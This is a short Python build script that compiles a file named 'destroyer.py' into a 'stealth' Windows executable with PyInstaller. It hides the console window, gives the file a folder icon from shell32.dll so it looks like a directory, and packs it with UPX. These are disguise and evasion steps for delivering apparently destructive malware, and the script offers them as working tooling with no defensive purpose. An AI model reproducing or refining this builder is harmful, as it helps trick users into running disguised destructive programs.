
# builder.py – compile to stealth EXE
import PyInstaller.__main__, os, shutil
src = 'destroyer.py'
dist = 'destroyer.exe'
PyInstaller.__main__.run([
    src,
    '--onefile',
    '--noconsole',
    '--name', dist,
    '--icon', 'C:\\Windows\\System32\\shell32.dll,14',  # folder icon
    '--upx-dir', shutil.which('upx') and os.path.dirname(shutil.which('upx')) or '.'
])
print('[+] Built', os.path.join('dist', dist))